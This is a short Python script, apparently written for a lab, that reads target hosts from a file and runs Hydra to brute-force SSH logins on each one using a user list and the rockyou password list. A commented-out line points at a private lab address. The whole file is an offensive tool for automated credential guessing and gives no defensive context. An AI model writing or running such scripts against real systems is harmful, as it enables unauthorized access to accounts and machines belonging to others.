import os

list = 0

ssh = open("ssh.txt",'r')
for account in ssh:
    list += 1
#    os.system("hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4")
    os.system(f"hydra -L users.txt -P rockyou.txt ssh://{account} -t 4")
